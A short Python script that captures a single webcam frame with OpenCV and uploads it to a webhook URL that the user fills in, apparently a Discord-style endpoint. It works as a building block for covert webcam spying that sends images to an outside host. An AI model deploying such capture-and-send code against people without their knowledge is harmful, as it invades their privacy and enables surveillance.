# do this in run (Win+R) pip install opencv-python requests
import cv2
import requests
# add your webhook url inside the ""
webhook_url = ""

def capture_image(filename="webcam_image.jpg"):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not open webcam.")
        return None
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(filename, frame)
        print(f"Image saved as {filename}")
    else:
        print("Error: Could not capture image.")
        filename = None
    cap.release()
    return filename

def send_image(filename):
    with open(filename, "rb") as image_file:
        files = {
            "file": image_file
        }
        response = requests.post(webhook_url, files=files)
        if response.status_code == 204:
            print("Image sent!")
        else:
            print(f"Failed to send image. Status code: {response.status_code}")
            print(response.text)

def main():
    filename = capture_image()
    if filename:
        send_image(filename)

if __name__ == "__main__":
    main()
